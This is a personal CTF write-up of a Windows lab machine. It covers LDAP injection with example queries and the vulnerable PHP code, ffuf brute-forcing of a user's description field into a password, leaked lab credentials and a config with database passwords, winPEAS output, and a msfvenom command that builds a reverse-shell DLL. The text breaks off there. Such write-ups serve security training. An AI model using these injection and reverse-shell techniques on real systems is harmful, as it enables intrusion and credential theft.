# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
- ` technician : 97NTtl*4QP96Bv `
- ` jdoe : 7y4Z4^*y9Zzj `
## External
### Enumeration

![](https://i.imgur.com/FAlhLLT.png)
![](https://i.imgur.com/24pFWvD.png)
![](https://i.imgur.com/eQ86jvA.png)
![](https://i.imgur.com/zC7iKNp.png)
![](https://i.imgur.com/JAotDKR.png)
![](https://i.imgur.com/TGlHWOQ.png)
![](https://i.imgur.com/6AAQw9V.png)
![](https://i.imgur.com/KDtjCvN.png)
![](https://i.imgur.com/7IgazPu.png)
- When i fuzz it i saw some reuslt on `*`
	- ![](https://i.imgur.com/bsPJjux.png)
- Funfact the name we got `technician` is a domain user
- ![](https://i.imgur.com/N7omknx.png)
![](https://i.imgur.com/2H8yLXD.png)
![](https://i.imgur.com/uu64Gqh.png)
![](https://i.imgur.com/bvwcadZ.png)
- After i Knew the Site Has `LDAP injection`. You can try som simple checks as the following
```shell
rex.com?name=a*   -> This means anything that starts with a.
	?name=b* ...  -> By this technique You can bruteforce and get all the name.

# On Active DIrectory Users have a default parameter called Description.
	- This means, we can get the description of the users we got from the above technique.

rex.com?name=natan)(description=*)   -> This can give us power to bruteforce as the before for the description.
```
- This Bruteforce for the description is as the follow.
```shell
ffuf -w /opt/seclists/Fuzzing/alphanum-case.txt  -u 'http://internal.analysis.htb/users/list.php?name=technician)(description=FUZZ*' -fs 406

 <SNIP>
 
9                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 485ms]

ffuf -w /opt/seclists/Fuzzing/alphanum-case.txt  -u 'http://internal.analysis.htb/users/list.php?name=technician)(description=9FUZZ*' -fs 406

<SNIP>

7                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 428ms]

ffuf -w /opt/seclists/Fuzzing/alphanum-case.txt  -u 'http://internal.analysis.htb/users/list.php?name=technician)(description=97FUZZ*' -fs 406

N                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 486ms]
```
- Sometimes our LDAP query can stack while we are bruteforcing Because of the character `*` In our Finding Word.
	- `*` is a wildcard, so LDAP will treat  like that . so to bypass that we will use `**` this is treated as `*`. so `*FUZZ*`
	- In this case we can do the `*` between the letters. 
```shell
rexder@HunterMachine ~/C/H/M/analysis> ffuf -w /opt/seclists/Fuzzing/alphanum-case.txt  -u 'http://internal.analysis.htb/users/list.php?name=technician)(description=97NTtl*FUZZ*' -fs 406

<...SNIP...>

4                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 324ms]
```
- Finally, Your fuzzing results will be stack and not responding that means the word is Completed.
	- By this case the completed word is `97NTtl*4QP96Bv`
```shell
rexder@HunterMachine ~/C/H/M/analysis> ffuf -w /opt/seclists/Fuzzing/alphanum-case.txt  -u 'http://internal.analysis.htb/users/list.php?name=technician)(description=97NTtl*4QP96BvFUZZ*' -fs 406
```
>[!abstract] This is how the back End looks
>```php  
>//Get standard users and contacts
>        $search_filter = '(&(objectCategory=person)(objectClass=user)(sAMAccountName='.$_GET['name'].'))';
>```
![](https://i.imgur.com/CIICPMu.png)
### Gaining Access
![](https://i.imgur.com/uWzTnNO.png)
![](https://i.imgur.com/MRRpZzs.png)
## Internal
### Enumeration
```
<?php
 $host = "localhost";
 $username = "db_master";
 $password = '0$TBO7H8s12yh&';
 $database = "employees";
 
$ldap_password = 'N1G6G46G@G!j';
$ldap_username = 'webservice@analysis.htb';
```
![](https://i.imgur.com/aNbCyjN.png)
### Gaining Access
![](https://i.imgur.com/f52HYk6.png)
```shell

ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
    (ANALYSIS\Administrateur) run_bctextencoder: C:\Users\jdoe\AppData\Local\Automation\run.bat
    Permissions file: jdoe [AllAccess]
    Permissions folder(DLL Hijacking): jdoe [AllAccess]
    Trigger: At log on of ANALYSIS\jdoe
```
![](https://i.imgur.com/flSaxrP.png)
```shell
*Evil-WinRM* PS C:\Users\jdoe\Documents> cat C:\Users\jdoe\AppData\Local\Automation\run.bat
start "BCEncoder" "C:\Program Files\BCTextEncoder\BCTextEncoder.exe"
```
### Maintaining Access
![](https://i.imgur.com/fa5Tdqv.png)
```shell
rexder@HunterMachine ~/C/H/M/analysis [1]> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f dll -a x64 -o rexde.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll f
```

# Random Notes